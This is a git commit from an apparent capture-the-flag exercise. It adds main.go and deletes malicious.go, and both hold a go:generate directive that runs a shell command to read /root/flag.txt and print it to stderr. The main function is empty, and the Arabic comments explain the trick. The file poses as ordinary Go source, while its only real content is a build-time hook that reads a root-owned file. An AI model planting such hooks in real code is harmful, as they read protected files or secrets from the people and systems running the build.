2d7167a5ebbac7c4ece0b7d24122032c27e5d6d2
M0stafa0x10 <127508997+MostafaMohamed2030@users.noreply.github.com>
2025-04-11 23:32:54 +0200

    main.go

---
+++ main.go
@@ -0,0 +1,4 @@
+//go:generate sh -c "cat /root/flag.txt >&2"
+package main
+
+func main() {} // دالة فارغة لتجنب الأخطاء
--- malicious.go
+++
@@ -1,6 +0,0 @@
-//go:generate sh -c "cat /root/flag.txt >&2"  // إخراج النتيجة عبر stderr
-package main
-
-func main() {
-    // دالة فارغة لتجنب الأخطاء
-}
